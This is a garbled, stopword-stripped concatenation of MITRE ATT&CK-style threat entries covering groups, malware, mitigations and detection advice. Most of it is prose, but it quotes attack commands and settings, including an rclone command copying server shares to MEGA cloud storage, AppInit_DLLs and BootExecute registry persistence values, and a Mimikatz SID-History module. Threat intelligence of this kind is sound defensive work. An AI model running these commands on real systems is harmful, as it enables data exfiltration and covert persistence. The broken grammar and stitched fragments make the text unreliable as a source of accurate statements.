retrieving login password information, including LaZagne.(Citation: Symantec Leafminer July 2018) victim meets criteria, [T9000](https://attack.mitre.org/software/S0098) AppInit_DLL functionality achieve persistence ensuring user mode process spawned load malicious DLL, ResN32.dll. creating Registry keys: <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs – %APPDATA%\Intel\ResN32.dll</code> <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs – 0x1</code>.(Citation: Palo Alto T9000 Feb 2016) [UNC2452](https://attack.mitre.org/groups/G0118) configured Exchange virtual directory <code>Get-WebServicesVirtualDirectory</code>.(Citation: Volexity SolarWinds) Security applications behavior exploitation Windows Defender Exploit Guard (WDEG) Enhanced Mitigation Experience Toolkit (EMET) mitigate exploitation behavior. (Citation: TechNet Moving EMET) Control flow integrity checking identify software exploit occurring. (Citation: Wikipedia Control Flow Integrity) protections depend architecture target application binary compatibility. [Cannon](https://attack.mitre.org/software/S0351) screenshot desktop.(Citation: Unit42 Cannon Nov 2018) [Sidewinder](https://attack.mitre.org/groups/G0121) configured tools automatically send collected files attacker controlled servers.(Citation: ATT Sidewinder January 2021) Monitor executed commands arguments establish persistence executing malicious content triggered execution tainted binaries. [Mustang Panda](https://attack.mitre.org/groups/G0129) installed TeamViewer targeted systems.(Citation: Secureworks BRONZE PRESIDENT December 2019) [Fox Kitten](https://attack.mitre.org/groups/G0117) installed TightVNC server client compromised servers endpoints lateral movement.(Citation: CISA AA20-259A Iran-Based Actor September 2020) [ZIRCONIUM](https://attack.mitre.org/groups/G0128) created Registry key named <code>Dropbox Update Setup</code> establish persistence malicious Python binary.(Citation: Zscaler APT31 Covid-19 October 2020) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors exfiltrated files sensitive data MEGA cloud storage [Rclone](https://attack.mitre.org/software/S1040) command `rclone.exe --max-age 2y "\\SERVER\Shares" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M`.(Citation: DFIR Conti Bazar Nov 2021) [Sandworm Team](https://attack.mitre.org/groups/G0034) Dropbear SSH hardcoded backdoor password maintain persistence target network. [Sandworm Team](https://attack.mitre.org/groups/G0034) VPN tunnels established legitimate software company infrastructure gain access internal networks software company's users.(Citation: ESET BlackEnergy Jan 2016)(Citation: ESET Telebots June 2017)(Citation: ANSSI Sandworm January 2021) [PLATINUM](https://attack.mitre.org/groups/G0068) leveraged zero-day vulnerability escalate privileges.(Citation: PLATINUM April 2016) [OopsIE](https://attack.mitre.org/software/S0264) capability delete files scripts victim's machine.(Citation: Unit 42 OilRig Sept 2018) [FunnyDream](https://attack.mitre.org/campaigns/C0007), threat actors tools batch files map victims' internal networks.(Citation: Bitdefender FunnyDream Campaign November 2020) [CosmicDuke](https://attack.mitre.org/software/S0050) exfiltrates collected files FTP WebDAV. Exfiltration servers separately configured C2 servers.(Citation: F-Secure Cosmicduke) Update software regularly employing patch management internal enterprise endpoints servers. utilizing seccomp, seccomp-bpf, solution restricts calls mount. Kubernetes environments, defining Pod Security Policy limits container access host process namespaces, host network, host file system.(Citation: Kubernetes Hardening Guide) [FIN10](https://attack.mitre.org/groups/G0051) Meterpreter enumerate users remote systems.(Citation: FireEye FIN10 June 2017) [Equation](https://attack.mitre.org/groups/G0020) observed utilizing environmental keying payload delivery.(Citation: Kaspersky Gauss Whitepaper)(Citation: Kaspersky Equation QA) [Threat Group-3390](https://attack.mitre.org/groups/G0027) lured victims malicious files malware.(Citation: Trend Micro DRBControl February 2020) [RDAT](https://attack.mitre.org/software/S0495) DNS communicate C2.(Citation: Unit42 RDAT July 2020)	 [Kimsuky](https://attack.mitre.org/groups/G0094) Twitter monitor potential victims prepare targeted phishing e-mails.(Citation: Malwarebytes Kimsuky June 2021) [Machete](https://attack.mitre.org/software/S0409) <code>netsh wlan networks mode=bssid</code> <code>netsh wlan interfaces</code> commands list nearby WiFi networks connected interfaces.(Citation: ESET Machete July 2019)  [QakBot](https://attack.mitre.org/software/S0650) target steal locally stored emails support thread hijacking phishing campaigns.(Citation: Kroll Qakbot June 2020)
(Citation: Kroll Qakbot June 2020)(Citation: Trend Micro Qakbot December 2020)(Citation: Kaspersky QakBot September 2021) [Hancitor](https://attack.mitre.org/software/S0499) ability download additional files C2.(Citation: Threatpost Hancitor) [PLATINUM](https://attack.mitre.org/groups/G0068) Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel command control.(Citation: PLATINUM June 2017) Monitor registry recovery features (ex: creation <code>HKEY_CURRENT_USER\Software\Policies\Microsoft\PreviousVersions\DisableLocalPage</code>). [PlugX](https://attack.mitre.org/software/S0013) Pastebin store C2 addresses.(Citation: Palo Alto PlugX June 2017) (Citation: Symantec Orangeworm April 2018) [ThreatNeedle](https://attack.mitre.org/software/S0665) relies victim malicious document initial execution.(Citation: Kaspersky ThreatNeedle Feb 2021) Monitor unexpected deletion windows registry hide configuration information, remove cleaning up, techniques aid persistence execution.  [Operation Spalax](https://attack.mitre.org/campaigns/C0005), threat actors variety packers, including CyaX, obfuscate malicious executables.(Citation: ESET Operation Spalax Jan 2021) [Drovorub](https://attack.mitre.org/software/S0502) kernel module rootkit hide processes, files, executables, network artifacts user space view.(Citation: NSA/FBI Drovorub August 2020) [MuddyWater](https://attack.mitre.org/groups/G0069) CMSTP.exe malicious INF execute [POWERSTATS](https://attack.mitre.org/software/S0223) payload.(Citation: FireEye MuddyWater Mar 2018) [WarzoneRAT](https://attack.mitre.org/software/S0670) encrypt C2 RC4 password `warzone160\x00`.(Citation: Check Warzone Feb 2020) [Clambling](https://attack.mitre.org/software/S0660) gained execution luring victims malicious files.(Citation: Trend Micro DRBControl February 2020) [HAWKBALL](https://attack.mitre.org/software/S0391) collect OS version, architecture information, name.(Citation: FireEye HAWKBALL Jun 2019) [BitPaymer](https://attack.mitre.org/software/S0570) <code>icacls /reset</code> <code>takeown /F</code> reset targeted executable's permissions ownership.(Citation: Crowdstrike Indrik November 2018) Segregate SNMP traffic separate management network.(Citation: US-CERT TA17-156A SNMP Abuse 2017)  Monitor firewall rules remote communication protocols SMD RDP. Modification firewall rules local ports services network profiles public domain. [Reaver](https://attack.mitre.org/software/S0172) creates shortcut file saves Startup folder establish persistence.(Citation: Palo Alto Reaver Nov 2017) [SoreFang](https://attack.mitre.org/software/S0516) ability list directories.(Citation: CISA SoreFang July 2016) (Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: DOJ APT10 Dec 2018) [VERMIN](https://attack.mitre.org/software/S0257) collects keystrokes victim machine.(Citation: Unit 42 VERMIN Jan 2018) [Squirrelwaffle](https://attack.mitre.org/software/S1030) relied victims malicious link send phishing campaigns.(Citation: ZScaler Squirrelwaffle Sep 2021) Kerberos preauthentication enabled default. protocols support preauthentication setting disabled. accounts preauthentication audit setting. Windows tools PowerShell easily accounts preauthentication disabled.  (Citation: Preauthentication Jul 2012)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) [Operation Spalax](https://attack.mitre.org/campaigns/C0005), threat actors staged malware malicious files legitimate hosting services OneDrive MediaFire.(Citation: ESET Operation Spalax Jan 2021) Users trained identify social engineering techniques spearphishing attempts. [AutoIt backdoor](https://attack.mitre.org/software/S0129) capable identifying documents victim extensions: .doc; .pdf, .csv, .ppt, .docx, .pst, .xls, .xlsx, .pptx, .jpeg.(Citation: Forcepoint Monsoon) [TA505](https://attack.mitre.org/groups/G0092) malware disable Windows Defender modification Registry.(Citation: Korean FSI TA505 2020) [Shamoon](https://attack.mitre.org/software/S0140) download executable victim.(Citation: Palo Alto Shamoon Nov 2016) [Bumblebee](https://attack.mitre.org/software/S1039) compress data stolen Registry volume shadow copies prior exfiltration.(Citation: Cybereason Bumblebee August 2022) [Rocke](https://attack.mitre.org/groups/G0106) malware download additional malicious files target system.(Citation: Talos Rocke August 2018)	 Monitor windows Registry values adversaries disable modify Firewall settings HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy. starts, [BADNEWS](https://attack.mitre.org/software/S0128) spawns thread log keystrokes.(Citation: Forcepoint Monsoon)(Citation: PaloAlto Patchwork Mar 2018)(Citation: TrendMicro Patchwork Dec 2017) Collect analyze signing certificate metadata software executes environment unusual certificate characteristics outliers. [APT29](https://attack.mitre.org/groups/G0016) acquired C2 domains, resellers.(Citation: MSTIC NOBELIUM Mar 2021)(Citation: FireEye SUNSHUTTLE Mar 2021)(Citation: MSTIC NOBELIUM 2021) [Stuxnet](https://attack.mitre.org/software/S0603) RPC server routine file deletion removes DLL export deleting specific files.(Citation: Symantec W.32 Stuxnet Dossier) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors compromised VPN accounts gain access victim systems.(Citation: McAfee Night Dragon) [PipeMon](https://attack.mitre.org/software/S0501) install additional modules C2 commands.(Citation: ESET PipeMon 2020) variant [Zebrocy](https://attack.mitre.org/software/S0251) captures screenshots victim’s machine JPEG BMP format.(Citation: Unit42 Cannon Nov 2018)(Citation: ESET Zebrocy Nov 2018)(Citation: Unit42 Sofacy Dec 2018)(Citation: ESET Zebrocy 2019)(Citation: Accenture SNAKEMACKEREL Nov 2018)(Citation: CISA Zebrocy Oct 2020) [APT29](https://attack.mitre.org/groups/G0016) set hostnames C2 infrastructure match legitimate hostnames victim environment. IP addresses originating country victim VPN infrastructure.(Citation: FireEye SUNBURST Backdoor December 2020) [Astaroth](https://attack.mitre.org/software/S0373) software packer called Pe123\RPolyCryptor.(Citation: Cybereason Astaroth Feb 2019) [Agent Tesla](https://attack.mitre.org/software/S0331) collect username victim’s machine.(Citation: DigiTrust Agent Tesla Jan 2017)(Citation: Fortinet Agent Tesla April 2018)(Citation: Malwarebytes Agent Tesla April 2020) [LAPSUS$](https://attack.mitre.org/groups/G1004) VPS hosting providers infrastructure.(Citation: MSTIC DEV-0537 Mar 2022) [QuasarRAT](https://attack.mitre.org/software/S0262) client process administrator privileges add registry key `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` persistence.(Citation: GitHub QuasarRAT)(Citation: CISA AR18-352A Quasar RAT December 2018)  Disable legacy network protocols   intercept network traffic applicable, environment. [ProLock](https://attack.mitre.org/software/S0654) encrypt files compromised host RC6, encrypts key RSA-1024.(Citation: IB Ransomware September 2020) Ensure Domain Controller backups properly secured. [Azorult](https://attack.mitre.org/software/S0344) steal credentials files belonging common software Skype, Telegram, Steam.(Citation: Unit42 Azorult Nov 2018) [POSHSPY](https://attack.mitre.org/software/S0150) uploads data 2048-byte chunks.(Citation: FireEye POSHSPY April 2017) [Dragonfly](https://attack.mitre.org/groups/G0035) dropped executed tools password cracking, including Hydra [CrackMapExec](https://attack.mitre.org/software/S0488).(Citation: US-CERT TA18-074A)(Citation: Kali Hydra) [RobbinHood](https://attack.mitre.org/software/S0400) stops 181 Windows services encryption process.(Citation: CarbonBlack RobbinHood 2019)  [LookBack](https://attack.mitre.org/software/S0582) VBA macros Word attachments drop additional files host.(Citation: Proofpoint LookBack Malware Aug 2019) [SynAck](https://attack.mitre.org/software/S0242) gathers names, OS version info, checks installed keyboard layouts estimate launched list countries.(Citation: SecureList SynAck Doppelgänging 2018) [Mimikatz](https://attack.mitre.org/software/S0002)'s <code>MISC::AddSid</code> module appended SID user/group account user's SID-History. [Mimikatz](https://attack.mitre.org/software/S0002) utilizes [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) expand scope components generated Kerberos Golden Tickets DCSync single domain.(Citation: Adsecurity Mimikatz Guide)(Citation: AdSecurity Kerberos Aug 2015) [TeamTNT](https://attack.mitre.org/groups/G0139) deployed types containers victim environments facilitate execution.(Citation: Intezer TeamTNT September 2020)(Citation: Trend Micro TeamTNT) [TeamTNT](https://attack.mitre.org/groups/G0139) transferred cryptocurrency mining software Kubernetes clusters discovered local IP address ranges.(Citation: Cisco Talos Intelligence Group) Require signed binaries. [TA505](https://attack.mitre.org/groups/G0092) variety tools operations, including [AdFind](https://attack.mitre.org/software/S0552), [BloodHound](https://attack.mitre.org/software/S0521), [Mimikatz](https://attack.mitre.org/software/S0002), [PowerSploit](https://attack.mitre.org/software/S0194).(Citation: NCC TA505) Toolkits PowerSploit framework PowerUp modules explore systems permission weaknesses scheduled tasks escalate privileges. (Citation: Powersploit) Windows operating creates registry key creation scheduled task destination host at: Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\At1. (Citation: Secureworks - AT.exe Scheduled Task) Linux macOS environments, scheduled tasks <code>[at](https://attack.mitre.org/software/S0110)</code> audited locally, centrally collected logging, syslog, auditd events host. (Citation: Kifarunix - Task Scheduling Linux) [Sibot](https://attack.mitre.org/software/S0589) downloaded DLL <code>C:\windows\system32\drivers\</code> folder renamed <code>.sys</code> extension.(Citation: MSTIC NOBELIUM Mar 2021) detecting adversaries accessing credentials difficult knowing exist environment, detect adversary credentials obtained. Monitor command-line arguments executing processes suspicious regular expressions searching password (for example: password, pwd, login, secure, credentials). [Valid Accounts](https://attack.mitre.org/techniques/T1078) information. [CosmicDuke](https://attack.mitre.org/software/S0050) steals user files network shared drives file extensions keywords match predefined list.(Citation: F-Secure Cosmicduke) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [MuddyWater](https://attack.mitre.org/groups/G0069) disguised malicious executables filenames Registry key names Windows Defender.(Citation: FireEye MuddyWater Mar 2018)(Citation: Talos MuddyWater 2019)(Citation: Anomali Static Kitten February 2021) [LoJax](https://attack.mitre.org/software/S0397) UEFI BIOS rootkit deployed persist remote access software targeted systems.(Citation: ESET LoJax Sept 2018) [APT39](https://attack.mitre.org/groups/G0087) modified customized versions publicly-available tools PLINK [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: BitDefender Chafer 2020)(Citation: IBM ITG07 June 2019) [Sandworm Team](https://attack.mitre.org/groups/G0034) developed malware operations, including malicious mobile applications destructive malware [NotPetya](https://attack.mitre.org/software/S0368) [Olympic Destroyer](https://attack.mitre.org/software/S0365).(Citation: District Court Indictment GRU Unit 74455 October 2020) [MuddyWater](https://attack.mitre.org/groups/G0069) disable system's local proxy settings.(Citation: Trend Micro Muddy Water March 2021) [Pony](https://attack.mitre.org/software/S0453) download additional files infected system.(Citation: Malwarebytes Pony April 2016)	 reviewing command history console running memory determine unauthorized suspicious commands modify device configuration. (Citation: Cisco IOS Software Integrity Assurance - Command History) comparing network device configuration known-good version discover unauthorized command interpreter. process accomplished comparison run-time memory, non-trivial require assistance vendor. [AppleJeus](https://attack.mitre.org/software/S0584) loaded plist file <code>launchctl</code> command.(Citation: CISA AppleJeus Feb 2021) [DustySky](https://attack.mitre.org/software/S0062) searches removable media duplicates it.(Citation: DustySky) Monitor newly executed processes attempt listing application windows. network discovery techniques occur operation adversary learns environment. Data events viewed isolation, chain behavior lead activities based obtained. multi-factor authentication remote logins. (Citation: Berkley Secure) [FLASHFLOOD](https://attack.mitre.org/software/S0036) achieves persistence entry Registry's key.(Citation: FireEye APT30) appended image files, [HAMMERTOSS](https://attack.mitre.org/software/S0037) commands encrypted key composed hard-coded string contained day's tweet. decrypt commands, investigator access intended malware sample, day's tweet, image file command.(Citation: FireEye APT29) [Janicab](https://attack.mitre.org/software/S0163) cron job persistence Mac devices.(Citation: Janicab) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. Adversaries install AppInit_DLLs binaries execute technique. Identify block malicious software executed AppInit_DLLs functionality application whitelisting (Citation: Beechey 2010) tools, Windows Defender Application Control(Citation: Windows Defender Application Control), AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) [TrickBot](https://attack.mitre.org/software/S0266) send compromised host upload data hardcoded C2 server.(Citation: Cyberreason Anchor December 2019)(Citation: Bitdefender Trickbot VNC module Whitepaper 2021) [Gorgon Group](https://attack.mitre.org/groups/G0078) malware PowerShell commands download execute payload decoy document victim’s machine.(Citation: Unit 42 Gorgon Aug 2018) [TajMahal](https://attack.mitre.org/software/S0467) ability screenshots infected host including capturing content windows instant messaging applications.(Citation: Kaspersky TajMahal April 2019) Monitor newly executed processes binaries involved shutting rebooting systems. [Stuxnet](https://attack.mitre.org/software/S0603) attempts impersonate anonymous token enumerate bindings service control manager.(Citation: Symantec W.32 Stuxnet Dossier) [APT37](https://attack.mitre.org/groups/G0067) collects name, BIOS model, execution path.(Citation: Talos Group123) [MechaFlounder](https://attack.mitre.org/software/S0459) ability identify username hostname compromised host.(Citation: Unit 42 MechaFlounder March 2019) [FIN5](https://attack.mitre.org/groups/G0053) source tool Essential NetTools map network build list targets.(Citation: Mandiant FIN5 GrrCON Oct 2016) [PoisonIvy](https://attack.mitre.org/software/S0012) keylogger.(Citation: FireEye Poison Ivy)(Citation: Symantec Darkmoon Aug 2005) [BITTER](https://attack.mitre.org/groups/G1002) spearphishing emails malicious RTF document Excel spreadsheet.(Citation: Cisco Talos Bitter Bangladesh 2022)(Citation: Forcepoint BITTER Pakistan Oct 2016) Monitor network traffic content evidence data exfiltration, gratuitous anomalous outbound traffic collected data. correlation process monitoring command lines collection exfiltration. [SILENTTRINITY](https://attack.mitre.org/software/S0692) establish persistence creating service.(Citation: GitHub SILENTTRINITY Modules July 2019) [Sakula](https://attack.mitre.org/software/S0074) UAC bypass code 32- 64-bit systems.(Citation: Dell Sakula) (Citation: QiAnXin APT-C-36 Feb2019) [ZLib](https://attack.mitre.org/software/S0086) creates Registry services.(Citation: Cylance Dust Storm) [Tarrask](https://attack.mitre.org/software/S1011) abuse Windows schtasks command-line tool create "hidden" scheduled tasks.(Citation: Tarrask scheduled task) [Mythic](https://attack.mitre.org/software/S0699) supports HTTP-based C2 profiles.(Citation: Mythc Documentation)	 [FIN7](https://attack.mitre.org/groups/G0046) VBS scripts perform tasks victim's machine.(Citation: FireEye FIN7 Aug 2018)(Citation: Flashpoint FIN 7 March 2019)(Citation: CrowdStrike Carbon Spider August 2021) Adversaries direct [BACKSPACE](https://attack.mitre.org/software/S0031) execute command infected hosts, [BACKSPACE](https://attack.mitre.org/software/S0031) create reverse shell.(Citation: FireEye APT30) [LAPSUS$](https://attack.mitre.org/groups/G1004) gathered detailed knowledge team structures target organization.(Citation: MSTIC DEV-0537 Mar 2022) Collecting comparing disk resource filenames binaries InternalName, OriginalFilename, ProductName match expected provide leads, indicative malicious activity. [GrimAgent](https://attack.mitre.org/software/S0632) hardcoded server public RSA key encrypt request C2.(Citation: IB GrimAgent July 2021) Monitor newly constructed services/daemons Windows event logs event IDs 4697 7045. (Citation: Secure Ideas SMB Relay) Deploy LLMNR/NBT-NS spoofing detection tool.(Citation: GitHub Conveigh) [Blue Mockingbird](https://attack.mitre.org/groups/G0108) Windows Scheduled Tasks establish persistence local remote hosts.(Citation: RedCanary Mockingbird 2020) [HyperStack](https://attack.mitre.org/software/S0537) default credentials connect IPC$ shares remote machines.(Citation: Accenture HyperStack October 2020) (Citation: FireEye APT41 Aug 2019) [APT33](https://attack.mitre.org/groups/G0064) base64 encode payloads.(Citation: FireEye APT33 Guardrail) [MoleNet](https://attack.mitre.org/software/S0553) PowerShell set persistence.(Citation: Cybereason Molerats Dec 2020)  [BADNEWS](https://attack.mitre.org/software/S0128) multiple C2 channels, including RSS feeds, Github, forums, blogs.(Citation: Forcepoint Monsoon)(Citation: PaloAlto Patchwork Mar 2018)(Citation: TrendMicro Patchwork Dec 2017) [Dridex](https://attack.mitre.org/software/S0384) perform browser attacks injects steal credentials, certificates, cookies.(Citation: Dell Dridex Oct 2015) [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) exploited CVE-2020-5902, F5 BIP-IP vulnerability, drop Linux backdoor. [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) exploited mis-configured Plesk servers.(Citation: ESET BackdoorDiplomacy Jun 2021) [xCmd](https://attack.mitre.org/software/S0123) execute binaries remote systems creating starting service.(Citation: xCmd) [Aoqin Dragon](https://attack.mitre.org/groups/G1007) Themida packer obfuscate malicious payloads.(Citation: SentinelOne Aoqin Dragon June 2022) [LoJax](https://attack.mitre.org/software/S0397) modified Registry key <code>‘HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute’</code> <code>‘autocheck autochk *’</code> <code>‘autocheck autoche *’</code> execute payload Windows startup.(Citation: ESET LoJax Sept 2018) (Citation: CrowdStrike Carbon Spider August 2021) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors staged archived files temporary directory prior exfiltration.(Citation: FoxIT Wocao December 2019)  [WannaCry](https://attack.mitre.org/software/S0366) thread attempt scan attached drives seconds. identified, encrypt files attached device.(Citation: FireEye WannaCry 2017) (Citation: Bizeul 2014)(Citation: Villeneuve 2014) [Caterpillar WebShell](https://attack.mitre.org/software/S0572) search files directories.(Citation: ClearSky Lebanese Cedar Jan 2021)  [Molerats](https://attack.mitre.org/groups/G0021) created scheduled tasks persistently VBScripts.(Citation: Unit42 Molerat Mar 2020) [RedLeaves](https://attack.mitre.org/software/S0153) launched DLL search hijacking load malicious dll.(Citation: FireEye APT10 April 2017) [QakBot](https://attack.mitre.org/software/S0650) gained execution users malicious links.(Citation: Trend Micro Qakbot 2020)(Citation: Kroll Qakbot June 2020)(Citation: Trend Micro Qakbot December 2020)(Citation: ATT QakBot April 2021)(Citation: Kaspersky QakBot September 2021)(Citation: IB Ransomware September 2020)
 [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) variants check parameters real hardware virtual machine environment, <code>sysctl hw.model</code>.(Citation: ESET OceanLotus macOS April 2019)(Citation: 20 macOS Common Tools Techniques) [Patchwork](https://attack.mitre.org/groups/G0040) path second-stage malware startup folder achieve persistence. file stealers persisted adding Registry key.(Citation: Cymmetria Patchwork)(Citation: TrendMicro Patchwork Dec 2017) Configure access controls firewalls limit access critical systems domain controllers. cloud environments support separate virtual private cloud (VPC) instances enable segmentation cloud systems. [Industroyer](https://attack.mitre.org/software/S0604) Trojanized version Windows Notepad application additional backdoor persistence mechanism.(Citation: ESET Industroyer) [Wevtutil](https://attack.mitre.org/software/S0645) security event logs system.(Citation: Wevtutil Documentation)(Citation: Crowdstrike DNC June 2016) [TrickBot](https://attack.mitre.org/software/S0266) secondary C2 servers communication establishing connectivity relaying victim primary C2 servers.(Citation: Cyberreason Anchor December 2019) [GALLIUM](https://attack.mitre.org/groups/G0093) variety widely-available tools, modified add functionality subvert antimalware solutions.(Citation: GALLIUM December 2019) [Kevin](https://attack.mitre.org/software/S1020) download files compromised host.(Citation: Kaspersky Lyceum October 2021) [Lazarus Group](https://attack.mitre.org/groups/G0032) nmap router VM scan ports systems restricted segment enterprise network.(Citation: Kaspersky ThreatNeedle Feb 2021) (Citation: Palo Alto OilRig 2016)(Citation: FireEye APT34 Dec 2017) Monitor files execute malicious payloads hijacking vulnerable file path references. [ServHelper](https://attack.mitre.org/software/S0382) C2.(Citation: Proofpoint TA505 Jan 2019) [Evilnum](https://attack.mitre.org/groups/G0120) steal cookies session browsers.(Citation: ESET EvilNum July 2020) Monitor logging, messaging, artifacts highlighting health host sensors (ex: metrics, errors, exceptions logging applications) shutting rebooting system. Windows event logs designate activity shutdown/reboot, ex. Event 1074 6006. [SombRAT](https://attack.mitre.org/software/S0615) ability respawn <code>ShellExecuteW</code> <code>CreateProcessW</code>.(Citation: BlackBerry CostaRicto November 2020) [Lazarus Group](https://attack.mitre.org/groups/G0032) collected data files compromised networks.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Loaders)(Citation: Novetta Blockbuster RATs)(Citation: Kaspersky ThreatNeedle Feb 2021)(Citation: ClearSky Lazarus Aug 2020)(Citation: McAfee Lazarus Jul 2020) [Ramsay](https://attack.mitre.org/software/S0458) collect Word documents target's file system, <code>.txt</code>, <code>.doc</code>, <code>.xls</code> files Internet Explorer cache.(Citation: Eset Ramsay 2020)(Citation: Antiy CERT Ramsay April 2020)	 [Operation Spalax](https://attack.mitre.org/campaigns/C0005), threat actors droppers anti-analysis checks executing malware compromised host.(Citation: ESET Operation Spalax Jan 2021) [Drovorub](https://attack.mitre.org/software/S0502) port forwarding rule agent module relay network traffic client module remote host network.(Citation: NSA/FBI Drovorub August 2020) [EVILNUM](https://attack.mitre.org/software/S0568) victim's system.(Citation: Prevailion EvilNum 2020) [MoonWind](https://attack.mitre.org/software/S0149) communicates ports 80, 443, 53, 8080 raw sockets protocols ports.(Citation: Palo Alto MoonWind March 2017) [Dacls](https://attack.mitre.org/software/S0497) collect data running parent processes.(Citation: TrendMicro macOS Dacls 2020) [APT32](https://attack.mitre.org/groups/G0050) collected victim's username executed <code>whoami</code> command victim's machine. [APT32](https://attack.mitre.org/groups/G0050) executed shellcode collect username victim's machine. (Citation: FireEye APT32 April 2020)(Citation: ESET OceanLotus)(Citation: Cybereason Cobalt Kitty 2017) [Patchwork](https://attack.mitre.org/groups/G0040) copied targeted files directory called eventually uploaded C&C server.(Citation: TrendMicro Patchwork Dec 2017) [Sidewinder](https://attack.mitre.org/groups/G0121) LNK files download remote files victim's network.(Citation: ATT Sidewinder January 2021)(Citation: Cyble Sidewinder September 2020) Enable firewall rules block RDP traffic network security zones network. [QakBot](https://attack.mitre.org/software/S0650) identify time targeted host.(Citation: Kaspersky QakBot September 2021) [STARWHALE](https://attack.mitre.org/software/S1037) exfiltrate collected data C2 servers.(Citation: DHS CISA AA22-055A MuddyWater February 2022) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors [Tor](https://attack.mitre.org/software/S0183) exit nodes execute commands.(Citation: FoxIT Wocao December 2019) [Attor](https://attack.mitre.org/software/S0438) plugin collects data stored Windows clipboard OpenClipboard GetClipboardData APIs.(Citation: ESET Attor Oct 2019) Monitor social media traffic suspicious activity, including messages requesting abnormal file data transfers (especially involving unknown, suspicious accounts).
Much activity occurrence false positive rate, visibility target organization, detection difficult defenders.
Detection efforts focused stages adversary lifecycle, Initial Access. Monitor loading modules scripting languages (ex: JScript.dll). [GALLIUM](https://attack.mitre.org/groups/G0093) WMI execution assist lateral movement installing tools multiple assets.(Citation: Cybereason Soft Cell June 2019) (Citation: Malwarebytes Higaisa 2020) [TeamTNT](https://attack.mitre.org/groups/G0139) checked running containers <code>docker ps</code> specific container names <code>docker inspect</code>.(Citation: Trend Micro TeamTNT) [TeamTNT](https://attack.mitre.org/groups/G0139) searched Kubernetes pods running local network.(Citation: Cisco Talos Intelligence Group) Monitor API calls search common password storage locations user credentials. Monitor newly constructed files create modify launch agents repeatedly execute malicious payloads persistence. [QakBot](https://attack.mitre.org/software/S0650) gained execution users malicious attachments.(Citation: Trend Micro Qakbot 2020)(Citation: Kroll Qakbot June 2020)(Citation: Crowdstrike Qakbot October 2020)(Citation: Trend Micro Qakbot December 2020)(Citation: Cyberint Qakbot 2021)(Citation: ATT QakBot April 2021)(Citation: Kaspersky QakBot September 2021)(Citation: IB Ransomware September 2020) [Clop](https://attack.mitre.org/software/S0611) uninstall disable security products.(Citation: Cybereason Clop Dec 2020) [TajMahal](https://attack.mitre.org/software/S0467) ability capture VoiceIP application audio infected host.(Citation: Kaspersky TajMahal April 2019) [Pony](https://attack.mitre.org/software/S0453) batch scripts delete execution.(Citation: Malwarebytes Pony April 2016)	 [APT32](https://attack.mitre.org/groups/G0050) backdoor non-standard TCP port (e.g 14146) backdoor configuration.(Citation: ESET OceanLotus Mar 2019) [MuddyWater](https://attack.mitre.org/groups/G0069) <code>cmd.exe user /domain</code> enumerate domain users.(Citation: Trend Micro Muddy Water March 2021) [Comnie](https://attack.mitre.org/software/S0244) <code>ipconfig /all</code> <code>route PRINT</code> identify network adapter interface information.(Citation: Palo Alto Comnie) (Citation: Kaspersky Lyceum October 2021)(Citation: Accenture Lyceum Targets November 2021) [ZxShell](https://attack.mitre.org/software/S0412) hooks API functions spawn threads.(Citation: Talos ZxShell Oct 2014)  [Winnti Linux](https://attack.mitre.org/software/S0430) ICMP, custom TCP, UDP outbound communications.(Citation: Chronicle Winnti Linux 2019) [Calisto](https://attack.mitre.org/software/S0274) capability upload download files victim's machine.(Citation: Symantec Calisto July 2018) [Dok](https://attack.mitre.org/software/S0281) installs LaunchAgents redirect network traffic randomly generated plist file maintaining format <code>com.random.name.plist</code>.(Citation: objsee mac malware 2017)(Citation: CheckPoint Dok) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [NETEAGLE](https://attack.mitre.org/software/S0034) download resources IP address port pair connect C2.(Citation: FireEye APT30) [Cobalt Strike](https://attack.mitre.org/software/S0154) configured commands relayed peer-to-peer network infected hosts. limit egress points, provide access host direct internet access.(Citation: cobaltstrike manual)(Citation: Cobalt Strike Manual 4.3 November 2020) [Cleaver](https://attack.mitre.org/groups/G0003) open-source tools [PsExec](https://attack.mitre.org/software/S0029), [Windows Credential Editor](https://attack.mitre.org/software/S0005), [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: Cylance Cleaver) [Silent Librarian](https://attack.mitre.org/groups/G0122) exfiltrated entire mailboxes compromised accounts.(Citation: DOJ Iran Indictments March 2018) [DustySky](https://attack.mitre.org/software/S0062) dropper function obfuscate functions malware.(Citation: DustySky) [NETWIRE](https://attack.mitre.org/software/S0198) XDG Autostart Entries establish persistence.(Citation: Red Canary NETWIRE January 2020) [Bisonal](https://attack.mitre.org/software/S0268) modified Windows service.(Citation: Talos Bisonal Mar 2020)  